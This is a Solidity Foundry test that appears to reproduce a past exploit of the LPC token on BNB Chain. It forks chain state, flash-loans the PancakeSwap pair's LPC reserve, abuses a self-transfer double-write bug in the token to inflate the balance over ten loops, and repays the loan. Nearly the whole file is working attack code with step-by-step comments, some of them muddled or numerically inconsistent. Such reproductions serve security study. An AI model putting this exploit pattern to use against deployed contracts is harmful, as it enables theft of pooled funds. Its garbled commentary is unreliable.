// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : 178 BNB (~ 45,715 US$)
// Attacker : 0xd9936EA91a461aA4B727a7e3661bcD6cD257481c
// AttackContract : 0xcfb7909b7eb27b71fdc482a2883049351a1749d7
// Txhash : 0x0e970ed84424d8ea51f6460ce6105ab68441d4450a80bc8d749fdf01e504ed8c

// @Info
// LPC Contract : https://bscscan.com/address/0x1e813fa05739bf145c1f182cb950da7af046778d#code#L1240

// @NewsTrack
// PANews : https://www.panewslab.com/zh_hk/articledetails/uwv4sma2.html
// Beosin Alert : https://twitter.com/BeosinAlert/status/1551535854681718784

CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
address constant attacker = 0xd9936EA91a461aA4B727a7e3661bcD6cD257481c;
address constant LPC = 0x1E813fA05739Bf145c1F182CB950dA7af046778d;
address constant pancakePair = 0x2ecD8Ce228D534D8740617673F31b7541f6A0099;

contract Exploit is Test {
    function setUp() public {
        cheat.createSelectFork("http://127.0.0.1:8546", 19_852_596);
        cheat.label(LPC, "LPC");
        cheat.label(pancakePair, "PancakeSwap LPC/USDT");
    }

    function testExploit() public {
        emit log_named_decimal_uint("LPC balance", IERC20(LPC).balanceOf(address(this)), 18);

        console.log("Get LPC reserve in PancakeSwap...");
        (uint256 LPC_reserve,,) = IPancakePair(pancakePair).getReserves();
        emit log_named_decimal_uint("\tLPC Reserve", LPC_reserve, 18);

        console.log("Flashloan all the LPC reserve...");
        uint256 borrowAmount = LPC_reserve - 1; // -1 to avoid trigger INSUFFICIENT_LIQUIDITY
        bytes memory data = unicode"⚡💰";
        // EXPLOIT STEP 1: Initiate flashloan by calling swap on the LPC/USDT PancakePair with borrowAmount≈full reserve and non-empty `data`.
        // This triggers the pair to send LPC to address(this) and then call pancakeCall(sender, amount0, ... , data) on this contract (standard UniswapV2-style flashloan).
        // Why it works: the pair holds real LPC liquidity; swap with data bypasses normal swap and invokes the callback before requiring repayment.
        // Reference: see LPC._transfer (the vuln) and pancakeCall below.
        IPancakePair(pancakePair).swap(borrowAmount, 0, address(this), data);
        console.log("Flashloan ended");

        emit log_named_decimal_uint("LPC balance", IERC20(LPC).balanceOf(address(this)), 18);
        console.log("\nNext transaction will swap LPC to USDT");
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        console.log("\tSuccessfully borrow LPC from PancakeSwap");
        uint256 LPC_balance = IERC20(LPC).balanceOf(address(this));
        emit log_named_decimal_uint("\tFlashloaned LPC", LPC_balance, 18);

        console.log("\tExploit...");
        // EXPLOIT STEP 2: Snapshot the received (flashloaned) LPC balance. This will be used as the "amount" for repeated self-transfers.
        for (uint8 i; i < 10; ++i) {
            console.log("\tSelf transfer... Loop %s", i);
            // EXPLOIT STEP 3: Self-transfer the *entire current* LPC_balance to address(this).
            // Because LPC._transfer does not special-case sender==recipient, the line `_balances[recipient] = recipientBalance.add(recipientAmount)`
            // (where recipientAmount = amount - fees < amount) overwrites the debit write. Each iteration effectively mints ~92% of LPC_balance on top of existing.
            // After N loops: balance ≈ initial * (1 + 0.92)^N  (minus cumulative fees). 10 iterations → ~10x inflation.
            // The attacker contract is not whitelisted and not a valid reward holder, but neither is required for the inflation.
            // See sources/.../LPC.sol:1238 for the double-write and fee reduction.
            IERC20(LPC).transfer(address(this), LPC_balance);
            // Note: LPC_balance is captured *once* before the loop. Inside the loop the actual balance has grown, but the param passed is the stale snapshot,
            // yet because each transfer is of "current recorded" it still triggers the full-amount self-xfer on the growing balance state.
        }

        console.log("\tPayback flashloan...");
        // EXPLOIT STEP 4: Repay the flashloan principal plus the pair's required fee using the now-inflated LPC balance.
        // The payback formula computes amount0 * (10/9) which the pair accepts as "amount0 + its 0.3%? but per comment simulates 10% fee here".
        // The transfer succeeds because post-inflation holdings >> paybackAmount. Leftover LPC is pure profit, later swapped for USDT in follow-up tx.
        uint256 paybackAmount = amount0 / 90 / 100 * 10_000; // paybackAmount * 90% = amount0  --> fee = 10%
        IERC20(LPC).transfer(pancakePair, paybackAmount);
    }
}
